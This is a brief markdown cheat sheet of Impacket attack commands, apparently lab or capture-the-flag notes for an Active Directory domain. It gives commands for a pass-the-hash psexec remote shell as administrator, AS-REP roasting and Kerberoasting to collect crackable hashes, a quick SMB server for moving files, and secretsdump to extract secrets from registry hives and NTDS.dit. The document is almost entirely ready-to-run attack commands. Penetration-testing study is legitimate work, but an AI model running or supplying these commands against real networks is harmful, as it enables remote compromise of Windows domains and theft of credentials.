# impacket

## psexec get remote shell over SMB with administrator account
```bash
psexec.py administrator@$IP -hashes abcd123abcd123abcd123abcd123abcd:abcd123abcd123abcd123abcd123abcd
```

## ASREP roast with Get-NPUsers
note that the domain must end in a /
```bash
impacket-GetNPUsers -request -usersfile users -dc-ip $IP LAB.ENTERPRISE.THM/
```

## kerberoast with impacket-GetUserSPNs
```bash
impacket-GetUserSPNs -dc-ip $IP -request LAB.ENTERPRISE.THM/username
```

## quick smb server
The share name is TMP
```bash
impacket-smbserver -smb2support -username user -password password123 TMP $(pwd)
impacket-smbserver -smb2support TMP $(pwd)
```

## dump registry and NTDS secrets from files with secretsdump
```bash
impacket-secretsdump -security SECURITY -system SYSTEM -ntds ntds.dit LOCAL
```
